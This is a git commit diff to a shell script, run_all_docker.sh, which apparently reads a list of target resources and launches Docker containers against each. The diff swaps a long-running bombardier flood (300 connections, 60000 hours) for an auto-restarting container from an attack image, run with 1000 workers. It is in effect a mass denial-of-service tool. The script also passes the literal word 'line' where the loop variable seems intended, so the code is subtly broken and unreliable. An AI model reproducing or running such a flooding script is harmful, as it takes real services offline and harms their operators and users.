c3b9752c2276891a5e7cf751fb6c93123f1f75e0
xchinaskix <jglushko93@gmail.com>
2022-03-12 14:06:00 +0200

    upd docker.sh and resources.txt

--- run_all_docker.sh
+++ run_all_docker.sh
@@ -13,7 +13,8 @@ do
   # echo "$i"
   # export URL=$i
   echo "running $line"
-  docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l line
+  # docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l line
+  docker run -i --restart unless-stopped ghcr.io/russkijkorablidinaxuj/russkijkorablidinaxuj:latest -N 1000 -i line -s=false
 done
 
 # IFS=$'\n' read -d '' -r -a lines < $RESOURCES_FILE
